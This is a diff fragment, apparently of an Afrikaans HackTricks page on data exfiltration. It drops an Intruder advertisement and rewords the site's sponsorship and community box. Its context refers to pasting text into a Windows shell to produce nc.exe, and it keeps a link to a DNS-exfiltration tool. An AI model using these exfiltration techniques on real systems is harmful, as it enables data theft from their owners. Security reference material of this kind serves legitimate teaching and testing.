@@ -797,23 +357,17 @@ Kopieer en plak dan die teks in die Windows-skulp en 'n lêer genaamd nc.exe sal
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
-
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 </details>
+```
